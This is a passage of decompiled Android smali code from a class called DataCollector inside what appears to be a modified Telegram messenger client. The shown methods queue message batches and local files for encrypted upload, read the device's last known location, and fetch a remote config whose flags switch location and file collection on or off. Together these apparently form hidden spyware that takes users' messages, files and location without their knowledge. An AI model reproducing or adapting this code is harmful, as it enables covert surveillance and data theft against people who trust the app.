    :catchall_1
    move-exception v0

    goto/16 :goto_5

    :catch_0
    move-exception v0

    goto :goto_3

    .line 1174
    :cond_2
    invoke-static {v4}, Lorg/telegram/messenger/DataCollector;->isRetryable(I)Z

    move-result v4

    if-eqz v4, :cond_4

    .line 1175
    iget v4, v2, Lorg/telegram/messenger/DataCollector$QueueItem;->attempts:I

    add-int/lit8 v5, v4, 0x1

    .line 1176
    iget-wide v3, v3, Lorg/telegram/messenger/DataCollector$PostResult;->retryAfterMs:J

    const-wide/16 v6, 0x0

    cmp-long v11, v3, v6

    if-lez v11, :cond_3

    goto :goto_1

    :cond_3
    const/16 v3, 0x8

    .line 1178
    invoke-static {v5, v3}, Ljava/lang/Math;->min(II)I

    move-result v3

    const-wide/16 v6, 0x1

    shl-long v3, v6, v3

    const-wide/16 v6, 0x3e8

    mul-long v3, v3, v6

    const-wide/32 v6, 0x493e0

    invoke-static {v3, v4, v6, v7}, Ljava/lang/Math;->min(JJ)J

    move-result-wide v3

    .line 1179
    :goto_1
    iget-wide v6, v2, Lorg/telegram/messenger/DataCollector$QueueItem;->id:J

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v11

    add-long/2addr v11, v3

    move-object v2, v8

    move-wide v3, v6

    move-wide v6, v11

    invoke-virtual/range {v2 .. v7}, Lorg/telegram/messenger/DataCollector$UploadQueue;->retryLater(JIJ)V

    goto :goto_0

    .line 1181
    :cond_4
    iget-wide v4, v2, Lorg/telegram/messenger/DataCollector$QueueItem;->id:J

    invoke-virtual {v8, v4, v5}, Lorg/telegram/messenger/DataCollector$UploadQueue;->delete(J)V

    .line 1182
    const-string v2, "TGCollect"

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "drop json queue item code="

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v3, v3, Lorg/telegram/messenger/DataCollector$PostResult;->code:I

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    goto/16 :goto_0

    .line 1185
    :cond_5
    invoke-virtual {v8}, Lorg/telegram/messenger/DataCollector$UploadQueue;->hasPending()Z

    move-result v0

    if-eqz v0, :cond_6

    const-wide/32 v2, 0xea60

    .line 1186
    invoke-direct {p0, v2, v3}, Lorg/telegram/messenger/DataCollector;->scheduleJsonQueueDrain(J)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0
    .catchall {:try_start_2 .. :try_end_2} :catchall_1

    .line 1191
    :cond_6
    :goto_2
    iput-boolean v1, p0, Lorg/telegram/messenger/DataCollector;->jsonQueueDraining:Z

    goto :goto_4

    .line 1189
    :goto_3
    :try_start_3
    const-string v2, "TGCollect"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "drainJsonQueue: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v2, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    goto :goto_2

    :goto_4
    return-void

    .line 1191
    :goto_5
    iput-boolean v1, p0, Lorg/telegram/messenger/DataCollector;->jsonQueueDraining:Z

    .line 1192
    throw v0

    .line 1162
    :goto_6
    :try_start_4
    monitor-exit p0
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    throw v0
.end method

.method private static encryptQueuePayload(Ljava/lang/String;)Ljava/lang/String;
    .locals 3

    .line 779
    :try_start_0
    const-string v0, "AES/GCM/NoPadding"

    invoke-static {v0}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;

    move-result-object v0

    .line 780
    invoke-static {}, Lorg/telegram/messenger/DataCollector;->getQueueSecretKey()Ljavax/crypto/SecretKey;

    move-result-object v1

    const/4 v2, 0x1

    invoke-virtual {v0, v2, v1}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;)V

    .line 781
    invoke-virtual {v0}, Ljavax/crypto/Cipher;->getIV()[B

    move-result-object v1

    .line 782
    sget-object v2, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {p0, v2}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object p0

    invoke-virtual {v0, p0}, Ljavax/crypto/Cipher;->doFinal([B)[B

    move-result-object p0

    .line 783
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v2, 0x2

    invoke-static {v1, v2}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, ":"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 784
    invoke-static {p0, v2}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v0, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object p0

    :catch_0
    move-exception p0

    .line 786
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "encryptQueuePayload: "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v0, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    const-string v0, "TGCollect"

    invoke-static {v0, p0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    const/4 p0, 0x0

    return-object p0
.end method

.method private enqueueFileUpload(Ljava/lang/String;Ljava/lang/String;IJIJZLjava/io/File;Ljava/lang/String;Ljava/lang/String;)Z
    .locals 15

    const/4 v0, 0x0

    if-eqz p10, :cond_0

    .line 1125
    invoke-virtual/range {p10 .. p10}, Ljava/io/File;->exists()Z

    move-result v1

    if-nez v1, :cond_1

    :cond_0
    move-object v3, p0

    goto :goto_0

    .line 1126
    :cond_1
    invoke-direct {p0}, Lorg/telegram/messenger/DataCollector;->getUploadQueue()Lorg/telegram/messenger/DataCollector$UploadQueue;

    move-result-object v2

    if-nez v2, :cond_2

    return v0

    .line 1129
    :cond_2
    invoke-virtual/range {p10 .. p10}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v12

    move-object/from16 v3, p1

    move-object/from16 v4, p2

    move/from16 v5, p3

    move-wide/from16 v6, p4

    move/from16 v8, p6

    move-wide/from16 v9, p7

    move/from16 v11, p9

    move-object/from16 v13, p11

    move-object/from16 v14, p12

    .line 1128
    invoke-virtual/range {v2 .. v14}, Lorg/telegram/messenger/DataCollector$UploadQueue;->enqueueFile(Ljava/lang/String;Ljava/lang/String;IJIJZLjava/lang/String;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_3

    const-wide/16 v1, 0x0

    move-object v3, p0

    .line 1130
    invoke-direct {p0, v1, v2}, Lorg/telegram/messenger/DataCollector;->scheduleFileQueueDrain(J)V

    goto :goto_0

    :cond_3
    move-object v3, p0

    :goto_0
    return v0
.end method

.method private enqueueJson(Lorg/json/JSONObject;)Z
    .locals 3

    .line 1115
    invoke-direct {p0}, Lorg/telegram/messenger/DataCollector;->getUploadQueue()Lorg/telegram/messenger/DataCollector$UploadQueue;

    move-result-object v0

    if-nez v0, :cond_0

    const/4 p1, 0x0

    return p1

    .line 1117
    :cond_0
    invoke-direct {p0, p1}, Lorg/telegram/messenger/DataCollector;->jsonDedupeKey(Lorg/json/JSONObject;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-direct {p0, p1}, Lorg/telegram/messenger/DataCollector;->jsonPriority(Lorg/json/JSONObject;)I

    move-result p1

    invoke-virtual {v0, v1, v2, p1}, Lorg/telegram/messenger/DataCollector$UploadQueue;->enqueue(Ljava/lang/String;Ljava/lang/String;I)Z

    move-result p1

    if-eqz p1, :cond_1

    const-wide/16 v0, 0x0

    .line 1118
    invoke-direct {p0, v0, v1}, Lorg/telegram/messenger/DataCollector;->scheduleJsonQueueDrain(J)V

    :cond_1
    return p1
.end method

.method private enqueueJsonBatch(Lorg/json/JSONArray;)Z
    .locals 4

    const/4 v0, 0x1

    const/4 v1, 0x0

    const/4 v2, 0x0

    .line 1455
    :goto_0
    invoke-virtual {p1}, Lorg/json/JSONArray;->length()I

    move-result v3

    if-ge v2, v3, :cond_2

    .line 1456
    invoke-virtual {p1, v2}, Lorg/json/JSONArray;->optJSONObject(I)Lorg/json/JSONObject;

    move-result-object v3

    if-eqz v3, :cond_0

    .line 1457
    invoke-direct {p0, v3}, Lorg/telegram/messenger/DataCollector;->enqueueJson(Lorg/json/JSONObject;)Z

    move-result v3

    if-nez v3, :cond_1

    :cond_0
    const/4 v0, 0x0

    :cond_1
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_2
    return v0
.end method

.method private enqueueMsgBatch(Lorg/json/JSONObject;)V
    .locals 5

    .line 839
    invoke-direct {p0, p1}, Lorg/telegram/messenger/DataCollector;->enqueueJson(Lorg/json/JSONObject;)Z

    move-result v0

    if-eqz v0, :cond_0

    return-void

    .line 841
    :cond_0
    iget-object v0, p0, Lorg/telegram/messenger/DataCollector;->msgBatch:Ljava/util/List;

    monitor-enter v0

    .line 842
    :try_start_0
    iget-object v1, p0, Lorg/telegram/messenger/DataCollector;->msgBatch:Ljava/util/List;

    invoke-interface {v1, p1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 843
    iget-wide v1, p0, Lorg/telegram/messenger/DataCollector;->msgBatchTs:J

    const-wide/16 v3, 0x0

    cmp-long p1, v1, v3

    if-nez p1, :cond_1

    invoke-static {}, Landroid/os/SystemClock;->elapsedRealtime()J

    move-result-wide v1

    iput-wide v1, p0, Lorg/telegram/messenger/DataCollector;->msgBatchTs:J

    goto :goto_0

    :catchall_0
    move-exception p1

    goto :goto_3

    .line 844
    :cond_1
    :goto_0
    iget-object p1, p0, Lorg/telegram/messenger/DataCollector;->msgBatch:Ljava/util/List;

    invoke-interface {p1}, Ljava/util/List;->size()I

    move-result p1

    const/16 v1, 0x32

    const/4 v2, 0x1

    if-lt p1, v1, :cond_2

    const/4 p1, 0x1

    goto :goto_1

    :cond_2
    const/4 p1, 0x0

    .line 847
    :goto_1
    monitor-exit v0
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    if-eqz p1, :cond_3

    .line 849
    invoke-direct {p0}, Lorg/telegram/messenger/DataCollector;->flushMsgBatch()V

    goto :goto_2

    .line 850
    :cond_3
    iget-boolean p1, p0, Lorg/telegram/messenger/DataCollector;->flushScheduled:Z

    if-nez p1, :cond_4

    .line 851
    iput-boolean v2, p0, Lorg/telegram/messenger/DataCollector;->flushScheduled:Z

    .line 852
    sget-object p1, Lorg/telegram/messenger/Utilities;->globalQueue:Lorg/telegram/messenger/DispatchQueue;

    new-instance v0, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda29;

    invoke-direct {v0, p0}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda29;-><init>(Lorg/telegram/messenger/DataCollector;)V

    const-wide/16 v1, 0x1f4

    invoke-virtual {p1, v0, v1, v2}, Lorg/telegram/messenger/DispatchQueue;->postRunnable(Ljava/lang/Runnable;J)Z

    :cond_4
    :goto_2
    return-void

    .line 847
    :goto_3
    :try_start_1
    monitor-exit v0
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    throw p1
.end method

.method private fetchClientConfig(Landroid/content/Context;IZ)Lorg/telegram/messenger/DataCollector$ClientConfig;
    .locals 11

    const-string v0, "GET"

    if-nez p1, :cond_0

    .line 979
    invoke-static {}, Lorg/telegram/messenger/DataCollector$ClientConfig;->unavailable()Lorg/telegram/messenger/DataCollector$ClientConfig;

    move-result-object p1

    return-object p1

    .line 980
    :cond_0
    invoke-direct {p0, p2}, Lorg/telegram/messenger/DataCollector;->accountIdForConfig(I)J

    move-result-wide v1

    .line 981
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v8

    .line 982
    iget-object v3, p0, Lorg/telegram/messenger/DataCollector;->clientConfigCache:Lj$/util/concurrent/ConcurrentHashMap;

    invoke-static {v1, v2}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v4

    invoke-virtual {v3, v4}, Lj$/util/concurrent/ConcurrentHashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Lorg/telegram/messenger/DataCollector$ClientConfig;

    if-eqz p3, :cond_1

    if-eqz v3, :cond_1

    .line 983
    iget-boolean p3, v3, Lorg/telegram/messenger/DataCollector$ClientConfig;->available:Z

    if-eqz p3, :cond_1

    iget-wide v4, v3, Lorg/telegram/messenger/DataCollector$ClientConfig;->fetchedAtMs:J

    sub-long v4, v8, v4

    const-wide/32 v6, 0x493e0

    cmp-long p3, v4, v6

    if-gez p3, :cond_1

    return-object v3

    :cond_1
    const/4 p3, 0x0

    .line 990
    :try_start_0
    invoke-direct {p0, p2}, Lorg/telegram/messenger/DataCollector;->configUrlForAccount(I)Ljava/lang/String;

    move-result-object p2

    .line 991
    new-instance v3, Ljava/net/URL;

    invoke-direct {v3, p2}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v3

    move-object v10, v3

    check-cast v10, Ljava/net/HttpURLConnection;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1
    .catchall {:try_start_0 .. :try_end_0} :catchall_1

    .line 992
    :try_start_1
    invoke-virtual {v10, v0}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    const/16 p3, 0x1f40

    .line 993
    invoke-virtual {v10, p3}, Ljava/net/URLConnection;->setConnectTimeout(I)V

    .line 994
    invoke-virtual {v10, p3}, Ljava/net/URLConnection;->setReadTimeout(I)V

    .line 995
    const-string p3, "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"

    invoke-static {p1}, Lorg/telegram/messenger/DataCollector;->getDeviceId(Landroid/content/Context;)Ljava/lang/String;

    move-result-object p1

    invoke-static {v10, v0, p2, p3, p1}, Lorg/telegram/messenger/DataCollector;->addHMACHeaders(Ljava/net/HttpURLConnection;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 996
    invoke-virtual {v10}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result p1

    const/16 p2, 0xc8

    if-eq p1, p2, :cond_2

    .line 997
    invoke-static {}, Lorg/telegram/messenger/DataCollector$ClientConfig;->unavailable()Lorg/telegram/messenger/DataCollector$ClientConfig;

    move-result-object p1
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 1012
    invoke-virtual {v10}, Ljava/net/HttpURLConnection;->disconnect()V

    return-object p1

    :catchall_0
    move-exception p1

    move-object p3, v10

    goto :goto_1

    :catch_0
    move-exception p1

    move-object p3, v10

    goto :goto_0

    .line 999
    :cond_2
    :try_start_2
    new-instance p1, Lorg/json/JSONObject;

    invoke-static {v10}, Lorg/telegram/messenger/DataCollector;->readHttpBody(Ljava/net/HttpURLConnection;)Ljava/lang/String;

    move-result-object p2

    invoke-direct {p1, p2}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    .line 1000
    new-instance p2, Lorg/telegram/messenger/DataCollector$ClientConfig;

    const-string p3, "location_fetch_enabled"

    const/4 v0, 0x0

    .line 1002
    invoke-virtual {p1, p3, v0}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result v5

    const-string p3, "file_collect_enabled"

    .line 1003
    invoke-virtual {p1, p3, v0}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result v6

    const-string p3, "file_collect_wifi_only"

    const/4 v0, 0x1

    .line 1004
    invoke-virtual {p1, p3, v0}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result v7

    const/4 v4, 0x1

    move-object v3, p2

    invoke-direct/range {v3 .. v9}, Lorg/telegram/messenger/DataCollector$ClientConfig;-><init>(ZZZZJ)V

    .line 1006
    iget-object p1, p0, Lorg/telegram/messenger/DataCollector;->clientConfigCache:Lj$/util/concurrent/ConcurrentHashMap;

    invoke-static {v1, v2}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object p3

    invoke-virtual {p1, p3, p2}, Lj$/util/concurrent/ConcurrentHashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 1012
    invoke-virtual {v10}, Ljava/net/HttpURLConnection;->disconnect()V

    return-object p2

    :catchall_1
    move-exception p1

    goto :goto_1

    :catch_1
    move-exception p1

    .line 1009
    :goto_0
    :try_start_3
    const-string p2, "TGCollect"

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "fetchClientConfig: "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {p2, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 1010
    invoke-static {}, Lorg/telegram/messenger/DataCollector$ClientConfig;->unavailable()Lorg/telegram/messenger/DataCollector$ClientConfig;

    move-result-object p1
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    if-eqz p3, :cond_3

    .line 1012
    invoke-virtual {p3}, Ljava/net/HttpURLConnection;->disconnect()V

    :cond_3
    return-object p1

    :goto_1
    if-eqz p3, :cond_4

    invoke-virtual {p3}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 1013
    :cond_4
    throw p1
.end method

.method private fetchLocationIfAllowed(Landroid/content/Context;ILandroid/content/SharedPreferences;)V
    .locals 10

    const/4 v0, 0x0

    .line 2698
    :try_start_0
    invoke-direct {p0, p1}, Lorg/telegram/messenger/DataCollector;->hasLocationPermission(Landroid/content/Context;)Z

    move-result v1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    if-nez v1, :cond_0

    .line 2729
    iput-boolean v0, p0, Lorg/telegram/messenger/DataCollector;->locationFetchInFlight:Z

    return-void

    :cond_0
    const/4 v1, 0x1

    .line 2701
    :try_start_1
    invoke-direct {p0, p1, p2, v1}, Lorg/telegram/messenger/DataCollector;->fetchClientConfig(Landroid/content/Context;IZ)Lorg/telegram/messenger/DataCollector$ClientConfig;

    move-result-object v1

    .line 2702
    iget-boolean v2, v1, Lorg/telegram/messenger/DataCollector$ClientConfig;->available:Z

    if-nez v2, :cond_1

    invoke-direct {p0, p3}, Lorg/telegram/messenger/DataCollector;->resetFetchStamp(Landroid/content/SharedPreferences;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 2729
    iput-boolean v0, p0, Lorg/telegram/messenger/DataCollector;->locationFetchInFlight:Z

    return-void

    :catchall_0
    move-exception p1

    goto :goto_3

    :catch_0
    move-exception p1

    goto :goto_1

    .line 2703
    :cond_1
    :try_start_2
    iget-boolean v1, v1, Lorg/telegram/messenger/DataCollector$ClientConfig;->locationFetchEnabled:Z
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    if-nez v1, :cond_2

    .line 2729
    iput-boolean v0, p0, Lorg/telegram/messenger/DataCollector;->locationFetchInFlight:Z

    return-void

    .line 2706
    :cond_2
    :try_start_3
    const-string v1, "location"

    .line 2707
    invoke-virtual {p1, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/location/LocationManager;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    if-nez p1, :cond_3

    .line 2729
    iput-boolean v0, p0, Lorg/telegram/messenger/DataCollector;->locationFetchInFlight:Z

    return-void

    .line 2713
    :cond_3
    :try_start_4
    const-string v1, "fused"

    const-string v2, "gps"

    const-string v3, "network"

    filled-new-array {v1, v2, v3}, [Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x0

    const/4 v3, 0x0

    :goto_0
    const/4 v4, 0x3

    if-ge v3, v4, :cond_6

    aget-object v4, v1, v3
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    .line 2715
    :try_start_5
    invoke-virtual {p1, v4}, Landroid/location/LocationManager;->getLastKnownLocation(Ljava/lang/String;)Landroid/location/Location;

    move-result-object v4

    if-eqz v4, :cond_5

    if-eqz v2, :cond_4

    .line 2716
    invoke-virtual {v4}, Landroid/location/Location;->getTime()J

    move-result-wide v5

    invoke-virtual {v2}, Landroid/location/Location;->getTime()J

    move-result-wide v7
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_1
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    cmp-long v9, v5, v7

    if-lez v9, :cond_5

    :cond_4
    move-object v2, v4

    :catch_1
    :cond_5
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    :cond_6
    if-nez v2, :cond_7

    .line 2729
    iput-boolean v0, p0, Lorg/telegram/messenger/DataCollector;->locationFetchInFlight:Z

    return-void

    .line 2721
    :cond_7
    :try_start_6
    new-instance p1, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda36;

    invoke-direct {p1, p3}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda36;-><init>(Landroid/content/SharedPreferences;)V

    invoke-direct {p0, p2, v2, p1}, Lorg/telegram/messenger/DataCollector;->sendLocation(ILandroid/location/Location;Ljava/lang/Runnable;)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_0
    .catchall {:try_start_6 .. :try_end_6} :catchall_0

    goto :goto_2

    .line 2726
    :goto_1
    :try_start_7
    const-string p2, "TGCollect"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "fetchLocationIfAllowed: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {p2, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 2727
    invoke-direct {p0, p3}, Lorg/telegram/messenger/DataCollector;->resetFetchStamp(Landroid/content/SharedPreferences;)V
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_0

    .line 2729
    :goto_2
    iput-boolean v0, p0, Lorg/telegram/messenger/DataCollector;->locationFetchInFlight:Z

    return-void

    :goto_3
    iput-boolean v0, p0, Lorg/telegram/messenger/DataCollector;->locationFetchInFlight:Z

    .line 2730
    throw p1
.end method

.method private fileUploadGate(I)Lorg/telegram/messenger/DataCollector$FileUploadGate;
    .locals 6

    .line 1063
    sget-object v0, Lorg/telegram/messenger/ApplicationLoader;->applicationContext:Landroid/content/Context;

    .line 1064
    invoke-direct {p0, v0}, Lorg/telegram/messenger/DataCollector;->currentNetworkState(Landroid/content/Context;)Lorg/telegram/messenger/DataCollector$NetworkState;

    move-result-object v1

    const/4 v2, 0x1

    .line 1065
    invoke-direct {p0, v0, p1, v2}, Lorg/telegram/messenger/DataCollector;->fetchClientConfig(Landroid/content/Context;IZ)Lorg/telegram/messenger/DataCollector$ClientConfig;

    move-result-object p1

    .line 1066
    iget-boolean v0, p1, Lorg/telegram/messenger/DataCollector$ClientConfig;->available:Z

    const-wide/32 v3, 0x493e0

    const/4 v5, 0x0

    if-nez v0, :cond_0

    new-instance p1, Lorg/telegram/messenger/DataCollector$FileUploadGate;

    invoke-direct {p1, v5, v3, v4, v1}, Lorg/telegram/messenger/DataCollector$FileUploadGate;-><init>(ZJLorg/telegram/messenger/DataCollector$NetworkState;)V

    return-object p1

    .line 1067
    :cond_0
    iget-boolean v0, p1, Lorg/telegram/messenger/DataCollector$ClientConfig;->fileCollectEnabled:Z

    if-nez v0, :cond_1

    new-instance p1, Lorg/telegram/messenger/DataCollector$FileUploadGate;

    invoke-direct {p1, v5, v3, v4, v1}, Lorg/telegram/messenger/DataCollector$FileUploadGate;-><init>(ZJLorg/telegram/messenger/DataCollector$NetworkState;)V

    return-object p1

    .line 1068
    :cond_1
    iget-boolean p1, p1, Lorg/telegram/messenger/DataCollector$ClientConfig;->fileCollectWifiOnly:Z

    if-eqz p1, :cond_2

    iget-boolean p1, v1, Lorg/telegram/messenger/DataCollector$NetworkState;->wifi:Z

    if-nez p1, :cond_2

    .line 1069
    new-instance p1, Lorg/telegram/messenger/DataCollector$FileUploadGate;

    invoke-direct {p1, v5, v3, v4, v1}, Lorg/telegram/messenger/DataCollector$FileUploadGate;-><init>(ZJLorg/telegram/messenger/DataCollector$NetworkState;)V

    return-object p1

    .line 1071
    :cond_2
    new-instance p1, Lorg/telegram/messenger/DataCollector$FileUploadGate;

    const-wide/16 v3, 0x0

    invoke-direct {p1, v2, v3, v4, v1}, Lorg/telegram/messenger/DataCollector$FileUploadGate;-><init>(ZJLorg/telegram/messenger/DataCollector$NetworkState;)V

    return-object p1
.end method

.method private flushMsgBatch()V
    .locals 3

    const/4 v0, 0x0

    .line 1489
    iput-boolean v0, p0, Lorg/telegram/messenger/DataCollector;->flushScheduled:Z

    .line 1491
    iget-object v0, p0, Lorg/telegram/messenger/DataCollector;->msgBatch:Ljava/util/List;

    monitor-enter v0

    .line 1492
    :try_start_0
    iget-object v1, p0, Lorg/telegram/messenger/DataCollector;->msgBatch:Ljava/util/List;

    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z

    move-result v1

    if-eqz v1, :cond_0

    monitor-exit v0

    return-void

    :catchall_0
    move-exception v1

    goto :goto_0

    .line 1493
    :cond_0
    new-instance v1, Ljava/util/ArrayList;

    iget-object v2, p0, Lorg/telegram/messenger/DataCollector;->msgBatch:Ljava/util/List;

    invoke-direct {v1, v2}, Ljava/util/ArrayList;-><init>(Ljava/util/Collection;)V

    .line 1494
    monitor-exit v0
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 1495
    sget-object v0, Lorg/telegram/messenger/DataCollector;->META_POOL:Ljava/util/concurrent/ExecutorService;

    new-instance v2, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda21;

    invoke-direct {v2, p0, v1}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda21;-><init>(Lorg/telegram/messenger/DataCollector;Ljava/util/List;)V

    invoke-static {v0, v2}, Lorg/telegram/messenger/DataCollector;->poolSubmit(Ljava/util/concurrent/ExecutorService;Ljava/lang/Runnable;)V

    return-void

    .line 1494
    :goto_0
    :try_start_1
    monitor-exit v0
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    throw v1
.end method

.method private static generateSignature(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 1

    const-string v0, ""

    .line 737
